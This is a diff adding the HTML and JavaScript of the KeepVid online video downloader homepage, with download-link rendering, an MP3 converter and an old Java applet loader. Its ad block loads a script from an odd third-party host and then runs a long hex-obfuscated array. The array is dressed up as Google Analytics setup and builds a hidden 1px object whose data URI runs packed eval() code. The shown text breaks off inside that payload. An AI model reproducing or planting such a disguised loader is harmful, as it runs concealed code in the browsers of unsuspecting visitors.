@@ -1,0 +1,1062 @@
+<!doctype html>
+<html>
+<head>
+<title>[OFFICIAL] KeepVid: Download YouTube Videos, Facebook, Vimeo, Twitch.Tv, Dailymotion, Youku, Tudou, Metacafe and more!</title>
+<meta name="description" content="The #1 Free Online Video Downloader allows you to download videos from YouTube, Facebook, Vimeo, Twitch.Tv, Dailymotion, Youku, Tudou, Metacafe and heaps more!">
+<meta name="keywords" content="download youtube videos, keepvid, youtube downloader, download online videos, download streaming videos">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<meta name="robots" content="All,index,follow"><meta name="revisit-after" content="7 days">
+<meta property="og:image" content="https://pro.keepvid.com/images/keepvid-logo.png">
+<meta itemprop="image" content="https://pro.keepvid.com/images/keepvid-logo.png">
+<link rel="shortcut icon" href="http://keepvid.com/favicon.ico" />
+<link rel="stylesheet" type="text/css" href="/style/global.css?v=1.5">
+<link href="/style/kv_android.css?v=1.4.2" rel="stylesheet" type="text/css">
+<link rel="canonical" href="http://keepvid.com/?url=http%3A%2F%2Fyoutube.com%2Fwatch%3Fv%3DIys9IHmDJ1w&mode=mp3" />
+<link rel="alternate" hreflang="en" href="http://keepvid.com/" />
+<link rel="alternate" hreflang="ar" href="http://ar.keepvid.com/" />
+<link rel="alternate" hreflang="pt" href="http://br.keepvid.com/" />
+<link rel="alternate" hreflang="cs" href="http://cs.keepvid.com/" />
+<link rel="alternate" hreflang="da" href="http://da.keepvid.com/" />
+<link rel="alternate" hreflang="de" href="http://de.keepvid.com/" />
+<link rel="alternate" hreflang="el" href="http://el.keepvid.com/" />
+<link rel="alternate" hreflang="es" href="http://es.keepvid.com/" />
+<link rel="alternate" hreflang="fi" href="http://fi.keepvid.com/" />
+<link rel="alternate" hreflang="fr" href="http://fr.keepvid.com/" />
+<link rel="alternate" hreflang="ga" href="http://ga.keepvid.com/" />
+<link rel="alternate" hreflang="hu" href="http://hu.keepvid.com/" />
+<link rel="alternate" hreflang="it" href="http://it.keepvid.com/" />
+<link rel="alternate" hreflang="ms" href="http://ms.keepvid.com/" />
+<link rel="alternate" hreflang="nl" href="http://nl.keepvid.com/" />
+<link rel="alternate" hreflang="no" href="http://no.keepvid.com/" />
+<link rel="alternate" hreflang="pl" href="http://pl.keepvid.com/" />
+<link rel="alternate" hreflang="sv" href="http://sv.keepvid.com/" />
+<link rel="alternate" hreflang="th" href="http://th.keepvid.com/" />
+<link rel="alternate" hreflang="tr" href="http://tr.keepvid.com/" />
+<link rel="alternate" hreflang="vi" href="http://vi.keepvid.com/" />
+<link rel="alternate" hreflang="zh-cn" href="http://zh.keepvid.com/" />
+<style type="text/css">
+	#logoff{display:inline;}			.site-fl a{text-decoration:none;font-weight:normal}
+</style>
+<!-- helps slow down page for KeepVid Helper -->
+<link rel="stylesheet" type="text/css" href="/userscript/empty.css">
+
+<script type="text/javascript">
+if (parent.frames.length > 0) {window.top.location.href = location.href;};
+var ipurl='http://keepvid.com/webmasters/getip.php';
+var d=document;
+var sa="Save link as...";
+var ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36";
+var jc="Run";
+var jd="Cancel";
+var ja="Do not show this again for apps from the publisher and location above";
+var jar="kv.96.jar";
+var jarpre="KeepVidDownloader";
+var jarcls=jarpre+".class"
+var jaa=new Array();
+var jaaid=1;
+var mp3ft=""; //mp3 stored full title
+var mp3isdl=false; //mp3 toggle (if currently downloading, set to 'true')
+window.onbeforeunload = function(){if(mp3isdl==true) return "There are still downloads in progress.\r\nAre you sure you want to cancel them?";}
+function i(id){return d.getElementById(id)}
+function contains(a,obj){var i=a.length;while (i--){if(a[i]===obj){return true;}}return false;}
+function inbtwn(a,b,c){try{var a1 = a.split(b);var a2 = a1[1].split(c);return a2[0];}catch(err){return '';}}
+function hd(input){
+	var e = document.createElement('div');
+	e.innerHTML = input;
+	return e.childNodes.length === 0 ? "" : e.childNodes[0].nodeValue;
+}
+function hj(){if(navigator.userAgent.indexOf('MSIE')>-1){try{var a=new ActiveXObject('JavaWebStart.isInstalled');return true}catch(e){return false}}var b=navigator.mimeTypes&&navigator.mimeTypes.length&&(navigator.mimeTypes['application/x-java-jnlp-file']!=null||navigator.mimeTypes['application/x-java-vm']!=null);var c=navigator.javaEnabled();if(c==false)return c;else return b}
+function jl(){
+	try{d.getElementById("nl").innerHTML='<img src=\"images/ajax-loader.gif\" class=\"ld\" />Java Applet Loaded. Fetching links...';log("Java applet loaded and jl() function sent")}catch(e){}
+}
+function jn(){
+	try{d.getElementById("nl").innerHTML='<b>Error:</b> You clicked "<b>'+jd+'</b>". Please <b>restart</b> your browser and click "<b>'+jc+'</b>".';}catch(e){}
+}
+//alert for right-click, save as... (title incorrect|attachment header not set)
+function rs(w,t){
+	if(w.getAttribute("download")==undefined){
+		//alert("Right-Click this download link and choose \""+sa+"\"");
+		//window.prompt("Right-Click the download link and choose \""+sa+"\", then rename the file to this:", unescape(t).replace(/\+/g," "));
+		message = '';
+		message += 'Right-Click the download link and choose "';
+		message += 'Save link as...';
+		message += '",then rename the file to this:';
+		window.prompt(message, unescape(t).replace(/\+/g," "));
+		//if(window.prompt("Right-Click the download link and choose \""+sa+"\", then rename the file to this:", unescape(t).replace(/\+/g," "))){
+			//window.open(w.getAttribute("href"));
+		//}
+		return false;
+	}else{
+		return true;
+	}
+}
+//alert for links that have referer checks
+function rd(){alert("Drag this link to a new tab and press Ctrl+S");return false;}
+var pw_secs;
+function pleasewait(secs){
+	pw_secs = secs;
+	var countdown = setInterval(function(){
+		if(pw_secs<=0){
+			document.getElementById("nl").style.display="none";
+			clearInterval(countdown);
+		}else{
+			document.getElementById("nl").style.display="block";
+			var is1;
+			if(pw_secs!=1) is1 = "s";
+			document.getElementById("nl").innerHTML='<img src=\"images/ajax-loader.gif\" class=\"ld\" />Please wait '+pw_secs+' second'+is1+'...';
+			pw_secs = pw_secs - 1;
+		}
+	},1000);
+}
+
+//display info function
+function di(obj){
+	var output="";
+	try{d.getElementById("instructs").style.display="none";}catch(ex){};
+	var e=d.getElementById("dl");
+	e.innerHTML='';
+	var nd=d.createElement("div");nd.setAttribute("class","j");nd.setAttribute("id","info");
+	try{obj.title=decodeURIComponent(escape(obj.title))}catch(e){try{obj.title=decodeURIComponent(unescape(obj.title))}catch(e){}}
+	if(obj.image!=undefined) output+='<a href="'+obj.url+'" target="_blank" rel="nofollow"><img src="'+obj.image+'" class="m" /></a>';
+	output+='<a href="'+obj.url+'" class="n" target="_blank" rel="nofollow">'+obj.title+'</a><br />';
+	output+='<span class="p">'+obj.domain;
+	if(obj.user!=undefined){
+		try{obj.user=decodeURIComponent(escape(obj.user))}catch(e){try{obj.user=decodeURIComponent(unescape(obj.user))}catch(e){}}
+		output+=' / '+obj.user;
+	}
+	output+='</span><br />';
+	if(obj.duration!=undefined) output+='<span class="q">'+obj.duration+'</span>';
+	output+='<br clear="both" /><br />';
+	nd.innerHTML=output;
+	e.appendChild(nd);
+}
+//display download link function
+function dl(obj){
+	if(obj.title!=undefined) try{obj.title=decodeURIComponent(escape(obj.title))}catch(e){try{obj.title=decodeURIComponent(unescape(obj.title))}catch(e){}}
+	var output="";
+	var e=d.getElementById("dl");
+	var nd=d.createElement("div");
+	var cc="";
+	var colors={
+		"3GP": "2EADC9",
+		"FLV": "BF6D1B",
+		"MP4": "436DBA",
+		"WEBM": "52B27F",
+		"M4A": "87273A",
+		"MP3": "AF43B5",
+		"SRT": "B74B4B",
+		"F4V": "338F46"
+	};
+	if(colors[obj.type]!="") cc+=' style="color:#'+colors[obj.type]+';"';
+
+	if(obj.newtab==1) cc+=' target="_blank"';
+
+	if(obj.saveas==1 && obj.noref==1){
+		if(navigator.userAgent.match(/webkit/i)!=null) cc+=' rel="noreferrer"';
+		cc+=' onclick="return rd(this);"';
+	}else if(obj.saveas!=1 && obj.noref==1){
+		if(navigator.userAgent.match(/webkit/i)!=null) cc+=' rel="noreferrer"';
+		else cc+=' onclick="return rd(this);"';
+	}else if(obj.saveas==1){
+		cc+=' onclick="return rs(this,\''+escape(obj.title)+' '+obj.quality+'.'+obj.type.toLowerCase()+'\');"';
+	}
+
+	if(obj.saveas!=1 && obj.newtab!=1 && obj.title!=undefined && typeof(document.createElement('a')).download!=undefined) cc+=' download="'+obj.title+' '+obj.quality+'.'+obj.type.toLowerCase()+'"';
+
+	if(obj.fixedp==1) output+='<b style="color:#436DBA;">*FIXED*</b> ';
+	if(obj.newp==1) output+='<b style="color:#e01b3c;">*NEW*</b> ';
+
+	output+='<a';
+	if(obj.url!=undefined) output+=' href="'+obj.url+'"';
+	output+=' class="l"'+cc+'>&raquo; ';
+	output+='Download';
+	output+=' '+obj.type+' &laquo;</a>';
+
+	if(obj.quality!=undefined){
+		var tempqual = obj.quality;
+		output+=' - <b>'+tempqual+'</b>';
+	}
+	if(obj.more!=undefined) output+=' - '+obj.more+'';
+
+	if(!isNaN(obj.size) && obj.size!=null) output+='<span id="fs'+jaaid+'"> - '+(obj.size/1024/1024).toFixed(1).toString()+' MB</span>';
+	//if(obj.title!=undefined) output+='<button data-clipboard-text="'+obj.title+' '+obj.quality+'.'+obj.type.toLowerCase()+'">copy filename</button>';
+
+	if(obj.showsize==1 && document.cookie.match(/showsize=y/g)){
+		output+='<span id="fs'+jaaid+'"></span>';
+		dja({
+		params: {
+				"u": obj.url,
+				"method": "HEAD"
+				},
+		"dispose": 1,
+		"callback": function(da){
+				var fs;
+				try{
+					fstemp = da.headers.match(/Content-Length: ([0-9]+)/g);
+					fs = fstemp[fstemp.length-1].match(/Content-Length: ([0-9]+)/i)[1];
+				}catch(e){
+					fs=0;
+				}
+				d.getElementById('fs'+da.jaaid).innerHTML=" - "+(fs/1024/1024).toFixed(1).toString()+" MB";
+			}
+		});
+	}
+
+	nd.innerHTML=output;
+	e.appendChild(nd);
+}
+//function: convert seconds to 1:11 readable format
+function duration(secs){
+    hours = parseInt(secs / 3600) % 24;
+	minutes = parseInt(secs / 60) % 60;
+	seconds = secs % 60;
+    return (hours < 1 ? "" : hours+":")+((minutes < 10 && hours > 0) ? "0" + minutes : minutes)+":"+(seconds < 10 ? "0" + seconds : seconds);
+}
+
+//function: convertmp3 show download link
+function mp3dl(obj){
+	if(obj.title!=undefined) try{obj.title=decodeURIComponent(escape(obj.title))}catch(e){try{obj.title=decodeURIComponent(unescape(obj.title))}catch(e){}}
+	mp3ft=obj.title;
+	var output="";
+	var e=d.getElementById("dl");
+	var nd=d.createElement("div");
+	nd.setAttribute("id","hl")
+	var cc="";
+	var colors={
+		"MP3": "AF43B5"
+	};
+	if(colors[obj.type]!="") cc+=' style="color:#'+colors[obj.type]+';"';
+
+	output+='<a';
+	if(obj.url!=undefined) output+=' onclick="mp3cv(\''+escape(obj.title)+'\', \''+obj.url+'\');" rel="nofollow"';
+	output+=' class="l"'+cc+'>&raquo; ';
+	output+='Convert to';
+	output+=' '+obj.type+' &laquo;</a>';
+
+	if(obj.quality!=undefined) output+=' - <b>'+obj.quality+'</b>';
+
+	nd.innerHTML=output;
+	e.appendChild(nd);
+}
+//function: prompt and convert mp3
+function mp3cv(t,u){
+	ap({
+		params:{
+		"mode": "mp3",
+		"title": unescape(t),
+		"url": u
+		}
+	});
+}
+//function: update mp3 conversion progress
+function mp3progress(c,k){
+	var p = Math.round((c/k)*100);
+	var mo =  Math.round((c / 1024 / 1024)*Math.pow(10,2))/Math.pow(10,2);
+	var mt =  Math.round((k / 1024 / 1024)*Math.pow(10,2))/Math.pow(10,2);
+	if(p==100) d.getElementById('hl').innerHTML = 'Finished. <!--<a href="#" onclick="opendir();">Open Containing Folder</a>-->';
+	else d.getElementById('hl').innerHTML = 'Downloading & converting video to MP3: '+p+'% ('+mo+'MB of '+mt+'MB)';
+	d.title= '('+p+'%) '+mp3ft+' - KeepVid';
+}
+
+//function[test]: bypass referral checks
+function dr(u){
+	(i = d.createElement("iframe")).setAttribute("id","fr");
+	d.body.appendChild(i);
+	window.frames["fr"].document.body.innerHTML='<form method="get" action="'+u+'"></form>';
+	window.frames["fr"].document.forms[0].submit();
+	return false;
+}
+
+var jaa=new Array(); //still used in kvh
+var jaaid=1; //still used in kvh
+
+//old java applet code (obsolete) - START
+function dja(obj){
+	if(d.getElementById("jp"+jaaid) == undefined){
+		(i = d.createElement("div")).setAttribute("id","jp"+jaaid);
+		d.getElementById('applets').appendChild(i);
+	}
+	var apple;
+	//default params that never change
+	obj.params['mayscript']="true";
+	obj.params['initial_focus']="true";
+	obj.params['archive']=jar;
+	obj.params['cache_archive']=jar;
+	obj.params['code']=jarcls;
+	obj.params['codebase']="/";
+	obj.params['jaaid']=jaaid;
+	//obj.params['ua']=ua;
+	//document.getElementById('applets').innerHTML += '<div id="'+obj.id+'"></div>';
+	apple = '<object id="'+jarpre+'" height="1" width="1" codetype="application/x-java-applet" type="application/x-java-applet" classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93">';
+		for(var param in obj.params){
+			apple += '<param name="'+param+'" value="'+obj.params[param]+'" />';
+		}
+	apple += '<comment><embed id="'+jarpre+'" height="1" width="1" codetype="application/x-java-applet" type="application/x-java-applet" classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93"';
+		for(var param in obj.params){
+			apple += ' '+param+'="'+obj.params[param]+'"';
+		}
+	apple += '></comment></object>';
+	document.getElementById("jp"+jaaid).innerHTML = apple;
+
+	jaa[jaaid] = new Object();
+	jaa[jaaid].id = jaaid;
+	jaa[jaaid].dispose = obj.dispose;
+	jaa[jaaid].callback = obj.callback;
+	jaa[jaaid].it = setInterval((function(self){return function(){
+		if(self.response!=undefined){
+			clearInterval(self.it);
+			if(self.dispose==1) setTimeout(function(){d.getElementById('applets').removeChild(d.getElementById('jp'+self.id));},(Math.floor(Math.random() * (30000 - 1000 + 1)) + 1000));
+			d.getElementById('nl').style.display="none";
+			self.callback(self.response);
+		}
+	}})(this.jaa[jaaid]),1);
+	jaaid++;
+}
+function ap(obj){
+	if(typeof kvh_ext !== 'undefined'){
+		document.getElementById("nl").innerHTML='<img src=\"images/ajax-loader.gif\" class=\"ld\" />KeepVid Helper detected. Fetching links...';
+		document.getElementById("kvh_obj").innerHTML = JSON.stringify(obj);
+		document.getElementById("instructs").style.display="none";
+
+		jaa[jaaid] = new Object();
+		jaa[jaaid].id = jaaid;
+		jaa[jaaid].dispose = obj.dispose;
+		jaa[jaaid].callback = obj.callback;
+		jaa[jaaid].it = setInterval((function(self){return function(){
+			if(document.getElementById("kvh_data").innerHTML!="~kv"){
+				var xhr_resp = document.getElementById("kvh_data").innerHTML;
+				//clean up xhr_resp
+				xhr_resp = xhr_resp.replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&amp;/g,"&");
+				self.response={body: xhr_resp}
+				document.getElementById("kvh_data").innerHTML="~kv"; //ditch data
+				clearInterval(self.it); //finally ditch this interval
+				d.getElementById("nl").style.display="none";
+				self.callback(self.response);
+			}
+		}})(this.jaa[jaaid]),1000);
+
+		jaaid++;
+	}else{
+
+		log("Java applet file: "+jar);
+		if(hj()==false) try{d.getElementById("tip-java").style.display="block";log('Error: Java not installed/disabled');}catch(e){}
+		else try{d.getElementById("nl").innerHTML='<img src="images/ajax-loader.gif" class="ld" />Loading Java Applet...';}catch(e){}
+		log('Deploying Java applet...');
+		dja(obj);
+		log('Java applet deployed. Waiting for applet to run...');
+
+	}
+}
+//old java applet code (obsolete) - END
+
+function xhr(obj){
+	var xmlhttp;
+	try{
+		xmlhttp=new XMLHttpRequest();
+	}catch(e){
+		var xmlhttp_ids=new Array(
+			'MSXML2.XMLHTTP.5.0',
+			'MSXML2.XMLHTTP.4.0',
+			'MSXML2.XMLHTTP.3.0',
+			'MSXML2.XMLHTTP',
+			'MSXML3.XMLHTTP',
+			'Microsoft.XMLHTTP'
+		);
+		var success=false;
+		for(var i=0;i < xmlhttp_ids.length && !success;i++){
+			try {
+				xmlhttp=new ActiveXObject(xmlhttp_ids[i]);
+				success=true;
+			}catch(e){success=false;}
+		}
+	}
+	if(obj.data) obj.method = "POST";
+	if(obj.method==undefined) obj.method = "GET";
+	xmlhttp.open(obj.method,obj.url,true);
+    if(obj.data) xmlhttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+    xmlhttp.onreadystatechange=function(){
+        if(xmlhttp.readyState==4) obj.callback(xmlhttp.responseText);
+    }
+    if(obj.data) xmlhttp.send(obj.data);
+    else xmlhttp.send();
+	return true;
+}
+function error(msg){
+	try{d.getElementById("instructs").style.display="none";}catch(ex){};
+	var e=d.getElementById("msg-error");
+	var nd=d.createElement("div");
+	nd.innerHTML="<b>Error: </b> "+msg;
+	e.appendChild(nd);
+}
+function log(t){
+	var date = new Date(Math.round(new Date().getTime()/1000)*1000);
+
+	var year = date.getFullYear().toString();
+	var month = (date.getMonth() + 1).toString();if(month.length==1) month="0"+month;
+	var day = date.getDate().toString();if(day.length==1) day="0"+day;
+	var hours = date.getHours().toString();if(hours.length==1) hours="0"+hours;
+	var minutes = date.getMinutes().toString();if(minutes.length==1) minutes="0"+minutes;
+	var seconds = date.getSeconds().toString();if(seconds.length==1) seconds="0"+seconds;
+
+	var ds = "["+year+"-"+month+"-"+day+" "+hours+":"+minutes+":"+seconds+"]";
+	var z=d.getElementById("z");
+	z.innerHTML+="\r\n"+ds+" "+t;
+	if((z.scrollHeight - z.scrollTop)>=180) z.scrollTop = z.scrollHeight;
+}
+function ckswitch(opt,swi){
+	var expires = new Date();
+	expires.setTime(expires.getTime()+(1000*24*60*60*1000));
+	d.getElementById(opt+swi).style.display="inline";
+	if(swi=="on"){
+		document.cookie=opt+"=y; expires="+expires.toGMTString();
+		d.getElementById(opt+"off").style.display="none";
+	}else{
+		document.cookie=opt+"=n; expires="+expires.toGMTString();
+		d.getElementById(opt+"on").style.display="none";
+	}
+	window.location.reload();return false;
+}
+</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script type="text/javascript">
+var ti=0;
+function toggleNav(){
+	$("#mo-menu").toggle("slide");
+	if(ti==0) {$(document.body).attr("style","position:absolute;left:-270px;right:270px;");ti=1;}
+	else if(ti==1) {$(document.body).attr("style","position:static;left:0px;right:0px;");ti=0;}
+}
+$(document).ready(function(){
+		$("#mo-lines").click(function(){
+			if(window.innerWidth <= 640) {
+					toggleNav();
+			}
+		});
+});
+</script>
+</head>
+<body>
+<div class="header-strip">
+	<div class="container">
+		<h1><a href="http://keepvid.com/" class="header-logo" title="KeepVid: Download YouTube Videos, Facebook, Vimeo, Twitch.Tv, Dailymotion, Youku, Tudou, Metacafe and more!">KeepVid: Download YouTube Videos, Facebook, Vimeo, Twitch.Tv, Dailymotion, Youku, Tudou, Metacafe and more!</a></h1>
+		<ul class="header-menu">
+			<li class="menu-close"></li>
+			<li class="header-tab"><a href="http://keepvid.com/">ONLINE</a></li>
+			<li class="header-tab"><a href="https://pro.keepvid.com/" onclick="javascript:ga('send', {hitType: 'event',eventCategory:this.href,eventAction: 'home-desktop',eventLabel: document.location.pathname});" target="_blank">DESKTOP</a></li>
+						<li class="header-tab"><a href="/keepvid-android" style="padding-right:0px;">MOBILE								   <img style="width:30px;position:relative;padding-bottom:32px;left:-16px;" src="images/Slice.png"/>
+								</a></li>
+						<li class="header-tab"><a href="/extensions">EXTENSIONS</a></li>
+			<li class="header-tab"><a href="/webmasters">WEBMASTERS</a></li>
+			<li class="header-tab re"><a href="javascript:void(0)" class="btn-more">MORE</a>
+				<div class="moreBox" style="display: none;">
+					<dl>
+						<dt><a href="/programs">PROGRAMS</a></dt>
+						<dt><a href="/updates">UPDATES</a></dt>
+						<dt><a href="/help">HELP</a></dt>
+						<dt><a href="/sites/">SITES</a></dt>
+					</dl>
+				</div>
+			</li>
+			<li class="header-tab"><a href="https://www.facebook.com/KeepVidOfficial" target="_blank"><img src="style/images/icon_facebook.png" class="icon" alt=""></a></li>
+			<li class="header-tab"><a href="https://twitter.com/KeepVidOfficial" target="_blank"><img src="style/images/icon_twitter.png" class="icon" alt=""></a></li>
+		</ul>
+		<div class="mo-lines"></div>
+				<div class="clear"></div>
+	</div>
+	<div class="btn-lang"><span class="name">EN</span>
+		<div class="droBox" style="display:none;">
+			<ul>
+								<li><a href="http://keepvid.com/">English</a></li>
+								<li><a href="http://zh.keepvid.com/">简体中文</a></li>
+								<li><a href="https://ar.keepvid.com/">العربية</a></li>
+								<li><a href="https://br.keepvid.com/">Português</a></li>
+								<li><a href="https://cs.keepvid.com/">Czech</a></li>
+								<li><a href="https://da.keepvid.com/">Dansk</a></li>
+								<li><a href="https://de.keepvid.com/">Deutsch</a></li>
+								<li><a href="https://el.keepvid.com/">Ελληνικά</a></li>
+								<li><a href="https://es.keepvid.com/">Español</a></li>
+								<li><a href="https://fi.keepvid.com/">Suomi</a></li>
+								<li><a href="https://fr.keepvid.com/">Français</a></li>
+								<li><a href="https://ga.keepvid.com/">Gaeilge</a></li>
+								<li><a href="https://hu.keepvid.com/">Magyar</a></li>
+								<li><a href="https://it.keepvid.com/">Italiano</a></li>
+								<li><a href="https://ms.keepvid.com/">Bahasa Melayu</a></li>
+								<li><a href="https://nl.keepvid.com/">Nederlands</a></li>
+								<li><a href="https://no.keepvid.com/">Norway</a></li>
+								<li><a href="https://pl.keepvid.com/">Polski</a></li>
+								<li><a href="https://sv.keepvid.com/">Svenska</a></li>
+								<li><a href="https://th.keepvid.com/">ไทย</a></li>
+								<li><a href="https://tr.keepvid.com/">Türkçe</a></li>
+								<li><a href="https://vi.keepvid.com/">Tiếng Việt</a></li>
+								<li><a href="https://www.keepvid.jp/">日本語</a></li>
+							</ul>
+		</div>
+	</div>
+</div>
+<script type="text/javascript">
+	$(function(){
+		$(".btn-lang .name").click(function(){
+			$(this).next(".droBox").slideDown();
+		})
+		$(".btn-lang .droBox").mouseleave(function(){
+			$(this).slideUp();
+		});
+		$(".btn-more").click(function(){
+			$(this).next(".moreBox").slideDown();
+			$(this).toggleClass("curr");
+		})
+		$(".moreBox").mouseleave(function(){
+			$(this).slideUp();
+			$(".btn-more").removeClass("curr");
+		});
+		$(".mo-lines,.menu-close").click(function(){
+			$(".header-menu").toggleClass("hidden");
+		});
+		$(".mo-android").animate({"width":"45","height":"52"},200);
+		$(".mo-android").animate({"width":"25","height":"28"},300);
+		$(".mo-android").animate({"width":"45","height":"52"},300);
+		$(".mo-android").animate({"width":"32","height":"35.7"},200);
+		//$(".mo-android").animate({"width":"45","height":"52"},200);
+		//$(".mo-android").animate({"width":"32","height":"35.7"},200);
+		//$(".mo-android").animate({"width":"45","height":"52"},200);
+		//$(".mo-android").animate({"width":"32","height":"35.7"},200);
+	})
+</script>
+<div class="dlbar-strip">
+	<div class="container">
+		<form method="get" action="/">
+		<input type="submit" value="DOWNLOAD" id="dlsubmit" class="f" />
+		<script type="text/javascript">var d=document;var m="enter the link of the video you want to download: e.g http://www.youtube.com/watch?v=bMUxpTb_wWc";</script>
+		<div class="g"><input type="text" name="url" id="url" class="e" value="http://youtube.com/watch?v=Iys9IHmDJ1w" /></div>
+		<script type="text/javascript">var b=d.getElementById('url');if(b.value=="") b.value=m;m=b.value;b.onfocus=function(){if(b.value==m)b.value='';};b.onblur=function(){if(b.value=='')b.value=m;};</script>
+		</form>
+		
+<div class="add">
+<div>
+	<script src='//t.mdn2015x4.com/build/abfdafad/v1/'></script>
+    <script> 
+
+/*begin js*/
+
+ var script_id = "f1cb512f-5863-1674-ac7f-17fa52864b04"; 
+
+ var _$_447b=["\x64\x66\x30\x33\x65\x34\x37\x65\x2D\x39\x65\x66\x63\x2D\x63\x33\x35\x65\x2D\x35\x34\x62\x39\x2D\x62\x64\x30\x33\x33\x63\x63\x32\x31\x33\x61\x35","\x37\x34\x38\x38\x39\x30\x31\x35","\x77\x77\x77\x2E\x6B\x65\x65\x70\x76\x69\x64\x2E\x63\x6F\x6D","\x37\x32\x38\x78\x39\x30","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x73\x65\x74\x41\x63\x63\x6F\x75\x6E\x74","\x55\x41\x2D\x37\x38\x35\x30\x33\x33\x32\x36\x2D\x32","\x70\x75\x73\x68","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x73\x65\x74\x44\x6F\x6D\x61\x69\x6E\x4E\x61\x6D\x65","\x6E\x6F\x6E\x65","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x73\x65\x74\x53\x61\x6D\x70\x6C\x65\x52\x61\x74\x65","\x31","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x73\x65\x74\x41\x6C\x6C\x6F\x77\x4C\x69\x6E\x6B\x65\x72","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A","\x70\x72\x6F\x74\x6F\x63\x6F\x6C","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x73\x6C","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77","\x2E\x67\x6F\x6F\x67\x6C\x65\x2D\x61\x6E\x61\x6C\x79\x74\x69\x63\x73\x2E\x63\x6F\x6D\x2F\x67\x61\x2E\x6A\x73","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65","\x64\x6F\x6D\x61\x69\x6E","\x74\x72\x61\x63\x6B\x52\x4B\x73\x5F\x31\x5F\x70\x65\x72\x63\x65\x6E\x74\x3A\x20\x64\x6F\x6D\x61\x69\x6E\x3A\x20\x5B","\x5D","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x73\x65\x74\x43\x75\x73\x74\x6F\x6D\x56\x61\x72","\x6D\x61\x69\x6E\x52\x65\x67\x75\x6C\x61\x72\x5F\x67\x61\x43\x6F\x6E\x76\x65\x72\x74\x65\x72\x5F\x6D\x61\x69\x6E\x2E\x5F\x74\x72\x61\x63\x6B\x45\x76\x65\x6E\x74","\x75\x73\x65\x72\x20\x65\x76\x65\x6E\x74\x73","\x5F\x63\x72\x65\x61\x74\x65\x41\x6E\x61\x6C\x79\x74\x69\x63\x73\x53\x63\x72\x69\x70\x74","\x75\x70\x64\x61\x74\x65\x41\x6E\x61\x6C\x79\x74\x69\x63\x73","\x63\x63\x62\x7A\x67\x67\x78\x76\x62\x70\x70\x68\x77\x74\x77\x6C\x68\x62\x7A\x6C\x62\x63\x6A\x75\x72\x79\x68\x61\x70\x76\x7C\x7C\x73\x74\x61\x72\x74","","\x68\x72\x65\x66","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x63\x6C\x61\x73\x73\x4E\x61\x6D\x65","\x70\x6C\x61\x63\x65\x6D\x65\x6E\x74\x49\x44","\x6F\x62\x6A\x65\x63\x74","\x69\x64","\x77\x69\x64\x74\x68","\x31\x70\x78","\x68\x65\x69\x67\x68\x74","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x64\x61\x74\x61","\x64\x61\x74\x61\x3A\x74\x65\x78\x74\x2F\x68\x74\x6D\x6C\x2C\x3C\x68\x74\x6D\x6C\x3E\x3C\x68\x65\x61\x64\x3E\x3C\x73\x63\x72\x69\x70\x74\x3E\x65\x76\x61\x6C\x28\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x70\x2C\x61\x2C\x63\x2C\x6B\x2C\x65\x2C\x72\x29\x7B\x65\x3D\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x63\x29\x7B\x72\x65\x74\x75\x72\x6E\x28\x63\x3C\x61\x3F\x27\x27\x3A\x65\x28\x70\x61\x72\x73\x65\x49\x6E\x74\x28\x63\x2F\x61\x29\x29\x29\x2B\x28\x28\x63\x3D\x63\x25\x61\x29\x3E\x33\x35\x3F\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x63\x2B\x32\x39\x29\x3A\x63\x2E\x74\x6F\x53\x74\x72\x69\x6E\x67\x28\